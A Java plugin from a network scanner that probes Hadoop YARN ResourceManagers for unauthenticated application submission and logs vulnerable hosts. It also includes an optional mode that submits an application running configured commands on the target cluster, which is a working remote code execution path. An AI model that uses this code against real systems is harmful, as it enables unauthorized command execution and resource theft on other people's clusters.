package com.gbw.scanner.plugins.scripts.hadoop.yarn;

import com.gbw.scanner.Host;
import com.gbw.scanner.sink.SinkQueue;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.CommonConfigurationKeysPublic;
import org.apache.hadoop.yarn.api.ApplicationConstants;
import org.apache.hadoop.yarn.api.protocolrecords.GetNewApplicationResponse;
import org.apache.hadoop.yarn.api.records.*;
import org.apache.hadoop.yarn.client.api.YarnClient;
import org.apache.hadoop.yarn.client.api.YarnClientApplication;
import org.apache.hadoop.yarn.conf.YarnConfiguration;
import org.apache.hadoop.yarn.exceptions.YarnException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class GBWScanYarnIPCScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanYarnIPCScript.class);
    private GBWScanYarnConfig config;

    public GBWScanYarnIPCScript(GBWScanYarnConfig config){
        this.config = config;
    }


    private void setAMResourceCapability(ApplicationSubmissionContext appContext,GBWScanYarnResult result){

        Resource capability = Resource.newInstance(0, 0);

        long amMemory = Math.min(config.getMemory(),result.getMaxMem());
        int amVCores = Math.min(config.getVcores(),result.getMaxVcores());

        capability.setMemorySize(amMemory);
        capability.setVirtualCores(amVCores);

        appContext.setResource(capability);
        /*
        appContext.getAMContainerResourceRequests().get(0).setCapability(
                capability);*/
    }

    private Map<String,String> makeEnv(YarnConfiguration yarnConf) {

        Map<String,String> env = new HashMap<>();

        StringBuilder classPathEnv = new StringBuilder(ApplicationConstants.Environment.CLASSPATH.$$())
                .append(ApplicationConstants.CLASS_PATH_SEPARATOR).append("./*");
        for (String c : yarnConf.getStrings(
                YarnConfiguration.YARN_APPLICATION_CLASSPATH,
                YarnConfiguration.DEFAULT_YARN_CROSS_PLATFORM_APPLICATION_CLASSPATH)) {
            classPathEnv.append(ApplicationConstants.CLASS_PATH_SEPARATOR);
            classPathEnv.append(c.trim());
        }

        env.put("CLASSPATH", classPathEnv.toString());

        if(config.getEnvs()!=null) {
            for (GBWYarnEnv e : config.getEnvs()) {

                env.put(e.getKey(), e.getValue());
            }
        }
        return env;
    }


    private void runCmd(YarnConfiguration conf, YarnClient yarnClient, YarnClientApplication app,GBWScanYarnResult result,Host host) throws IOException, YarnException {

        ApplicationSubmissionContext appContext = app.getApplicationSubmissionContext();

        appContext.setApplicationName(config.getAppname());
        appContext.setPriority(Priority.newInstance(config.getPriority()));

        // Set up the container launch context for the application master
        ContainerLaunchContext amContainer = ContainerLaunchContext.newInstance(
                null, makeEnv(conf), config.getCmds(), null, null, null);

        appContext.setAMContainerSpec(amContainer);

        setAMResourceCapability(appContext,result);

        yarnClient.submitApplication(appContext);

        if(config.isMonitor()){

            monitorApplication(yarnClient,appContext.getApplicationId());
        }
    }

    private YarnConfiguration createConf(Host host){

        YarnConfiguration conf = new YarnConfiguration(new Configuration());
        conf.set(YarnConfiguration.RM_ADDRESS, host.getServer());
        conf.setInt(CommonConfigurationKeysPublic.IPC_CLIENT_KILL_MAX_KEY,1);
        conf.setInt(CommonConfigurationKeysPublic.IPC_CLIENT_CONNECT_MAX_RETRIES_ON_SOCKET_TIMEOUTS_KEY,config.getIpcRetries());
        conf.setInt(CommonConfigurationKeysPublic.IPC_CLIENT_CONNECT_MAX_RETRIES_KEY,config.getIpcRetries());

        conf.setBoolean(YarnConfiguration.AUTO_FAILOVER_ENABLED,false);
        conf.setInt(YarnConfiguration.CLIENT_FAILOVER_MAX_ATTEMPTS,1);
        conf.setInt(YarnConfiguration.CLIENT_FAILOVER_RETRIES,0);
        conf.setInt(YarnConfiguration.CLIENT_FAILOVER_RETRIES_ON_SOCKET_TIMEOUTS,0);

        return conf;
    }

    public boolean scan(Host host, SinkQueue sinkQueue) {

        YarnConfiguration conf = null;
        YarnClient yarnClient = null;

        boolean res = false;

        try {

            conf = createConf(host);
            yarnClient = YarnClient.createYarnClient();

            yarnClient.init(conf);
            yarnClient.start();

            // Get a new application id
            YarnClientApplication app = yarnClient.createApplication();

            if(app!=null){

                res = true;
                /*has hadoop yarn no auth bugs*/
                GetNewApplicationResponse appResponse = app.getNewApplicationResponse();
                ApplicationSubmissionContext appContext = app.getApplicationSubmissionContext();
                ApplicationId appId = appContext.getApplicationId();
                log.warn(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
                System.out.println(String.format("IPCScript Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
                GBWScanYarnResult result = new GBWScanYarnResult(config,host);
                result.setAppID(appId.toString());
                result.setScan("IPC");

                YarnClusterMetrics clusterMetrics = null;

                try {
                    clusterMetrics = yarnClient.getYarnClusterMetrics();
                }catch (Exception e){

                }

                if(clusterMetrics!=null) {
                    result.setMaxMem(appResponse.getMaximumResourceCapability().getMemorySize());
                    result.setMaxVcores(appResponse.getMaximumResourceCapability().getVirtualCores());
                    result.setNodes(clusterMetrics.getNumNodeManagers());
                }

                if(sinkQueue!=null)
                    sinkQueue.put(result);

                if(config.isRunCmd()){

                    runCmd(conf,yarnClient,app,result,host);
                }
            }

        } catch (Exception e){
            e.printStackTrace();
            log.error(String.format("scan yarn error:for:%s:%d message:%s",host.getServer(),host.getPort(),e.getMessage()));
        }finally {
            if(yarnClient!=null) {
                try {
                    yarnClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return res;
    }

    /**
     * Monitor the submitted application for completion.
     * Kill application if time expires.
     * @param appId Application Id of application to be monitored
     * @return true if application completed successfully
     * @throws YarnException
     * @throws IOException
     */
    private boolean monitorApplication(YarnClient yarnClient,ApplicationId appId)
            throws YarnException, IOException {

        long clientStartTime = System.currentTimeMillis();

        while (true) {

            // Check app status every 1 second.
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {

            }

            // Get application report for the appId we are interested in
            ApplicationReport report = yarnClient.getApplicationReport(appId);

            YarnApplicationState state = report.getYarnApplicationState();
            FinalApplicationStatus dsStatus = report.getFinalApplicationStatus();
            if (YarnApplicationState.FINISHED == state) {
                if (FinalApplicationStatus.SUCCEEDED == dsStatus) {
                    //log.info("Application has completed successfully. Breaking monitoring loop");
                    System.out.println("Application has completed successfully. Breaking monitoring loop");
                    return true;
                }
                else {
                    /*log.info("Application did finished unsuccessfully."
                            + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                            + ". Breaking monitoring loop");
                    */
                    System.out.println("Application did finished unsuccessfully."
                            + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                            + ". Breaking monitoring loop");

                    return false;
                }
            }
            else if (YarnApplicationState.KILLED == state
                    || YarnApplicationState.FAILED == state) {

                System.out.println("Application did not finish."
                        + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                        + ". Breaking monitoring loop");


                return false;
            }

            // The value equal or less than 0 means no timeout
            if (config.getTimeout() > 0
                    && System.currentTimeMillis() > (clientStartTime + config.getTimeout())) {

                System.out.println("Reached client specified timeout for application. ");

                return false;
            }
        }

    }


}
